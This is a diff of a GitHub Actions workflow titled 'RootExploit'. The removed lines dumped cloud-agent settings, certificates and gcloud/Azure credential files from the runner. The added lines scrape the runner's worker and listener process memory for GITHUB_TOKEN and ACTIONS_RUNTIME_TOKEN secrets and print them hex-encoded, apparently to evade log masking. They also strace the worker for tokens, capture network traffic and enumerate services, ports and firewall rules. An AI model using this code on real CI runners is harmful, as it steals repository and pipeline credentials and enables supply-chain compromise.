@@ -1,39 +1,96 @@
-name: WaagentGC
+name: RootExploit
 on:
   workflow_dispatch:
 jobs:
   j:
     runs-on: ubuntu-latest
     steps:
-      - name: waagent and gcloud
+      - name: root exploits
         timeout-minutes: 5
         run: |
           set +e
-          echo === VMSETTINGS JSON ===
-          sudo cat /var/lib/waagent/history/*/VmSettings.json 2>/dev/null | head -80
-          echo === FAST TRACK JSON ===
-          sudo cat /var/lib/waagent/fast_track.json 2>/dev/null | head -20
-          echo === CERTIFICATES JSON ===
-          sudo cat /var/lib/waagent/history/*/Certificates.json 2>/dev/null | head -30
-          echo === WAAGENT STATUS ===
-          sudo cat /var/lib/waagent/history/*/waagent_status.json 2>/dev/null | head -20
-          echo === OVF ENV ===
-          sudo cat /var/lib/waagent/ovf-env.xml 2>/dev/null | head -30
-          echo === GCLOUD CONFIG ===
-          sudo cat /root/.config/gcloud/gce 2>/dev/null
-          sudo find /root/.config/gcloud -type f 2>/dev/null | head -10
-          for f in $(sudo find /root/.config/gcloud -name '*.json' -o -name '*.yaml' -o -name 'gce' 2>/dev/null); do
-            echo "--- $f ---"
-            sudo cat "$f" 2>/dev/null | head -15
-          done
-          echo === GCLOUD LOG ===
-          sudo cat /root/.config/gcloud/logs/2026.07.20/08.29.36.062792.log 2>/dev/null | head -20
-          echo === NUGET CACHE ===
-          sudo find /root/.local/share/NuGet -type f 2>/dev/null | head -5
-          echo === GEM SPECS ===
-          sudo find /root/.local/share/gem -name '*credential*' -o -name '*token*' -o -name '*secret*' 2>/dev/null | head -5
-          echo === POWERSHELL PROFILE ===
-          sudo cat /root/.config/powershell/profile.ps1 2>/dev/null | head -15
-          echo === ALL AZURE LOGS ===
-          sudo cat /root/.azure/commands/*.log 2>/dev/null | head -30
+          echo === GITHUB_TOKEN FROM WORKER MEMORY ===
+          WPID=$(pgrep -f Runner.Worker | head -1)
+          echo "Worker PID: $WPID"
+          sudo python3 -c "
+import os, sys
+pid = '$WPID'
+if not pid: sys.exit()
+maps = open(f'/proc/{pid}/maps').readlines()
+mem = open(f'/proc/{pid}/mem', 'rb')
+found = set()
+for line in maps:
+    parts = line.split()
+    if 'r' not in parts[1]: continue
+    a = parts[0].split('-')
+    s, e = int(a[0],16), int(a[1],16)
+    if e-s > 30*1024*1024: continue
+    try:
+        mem.seek(s)
+        data = mem.read(e-s)
+        idx = 0
+        while True:
+            idx = data.find(b'ghs_', idx)
+            if idx == -1: break
+            token = bytearray()
+            for b in data[idx:idx+1000]:
+                if 32 <= b <= 126: token.append(b)
+                else: break
+            t = token.decode('ascii')
+            if len(t) > 100 and 'eyJ' in t and t not in found:
+                found.add(t)
+                print(f'TOKEN len={len(t)}')
+                print(t.encode().hex())
+            idx += 4
+    except: pass
+print(f'Total unique tokens: {len(found)}')
+"
+          echo
+          echo === STRACE WORKER ===
+          sudo timeout 3 strace -p $WPID -e trace=write -s 500 2>&1 | grep -i 'token\|ghs_\|eyJ\|bearer\|secret' | head -20
+          echo
+          echo === LISTENER TOKENS ===
+          LPID=$(pgrep -f Runner.Listener | head -1)
+          sudo python3 -c "
+import os
+pid = '$LPID'
+if not pid: exit()
+maps = open(f'/proc/{pid}/maps').readlines()
+mem = open(f'/proc/{pid}/mem', 'rb')
+for line in maps:
+    parts = line.split()
+    if 'r' not in parts[1]: continue
+    a = parts[0].split('-')
+    s, e = int(a[0],16), int(a[1],16)
+    if e-s > 30*1024*1024: continue
+    try:
+        mem.seek(s)
+        data = mem.read(e-s)
+        for pattern in [b'ACTIONS_RUNTIME_TOKEN=', b'ACTIONS_RESULTS_URL=', b'ACTIONS_CACHE_URL=', b'ACTIONS_ID_TOKEN_REQUEST_TOKEN=']:
+            idx = data.find(pattern)
+            if idx != -1:
+                chunk = data[idx:idx+2000].split(b'\x00')[0]
+                name, val = chunk.decode('utf-8','replace').split('=',1)
+                print(f'{name}: len={len(val)}')
+                print(f'hex: {val.encode().hex()[:300]}')
+    except: pass
+"
+          echo
+          echo === NETWORK CAPTURE ===
+          sudo timeout 3 tcpdump -i any -c 50 -nn 'port 443' 2>&1 | head -20
+          echo
+          echo === SYSTEMD SERVICES ===
+          sudo systemctl list-units --type=service --state=running 2>/dev/null | head -20
+          echo
+          echo === LISTENING PORTS ===
+          sudo ss -tlnp 2>/dev/null
+          echo
+          echo === JOURNAL INTERESTING ===
+          sudo journalctl -u hosted-compute-agent --no-pager 2>/dev/null | tail -20
+          echo === JOURNAL PRIMER ===
+          sudo journalctl -u primer --no-pager 2>/dev/null | tail -10
+          echo
+          echo === IPTABLES FULL ===
+          sudo iptables-save 2>/dev/null | head -30
+          echo
           echo === DONE ===
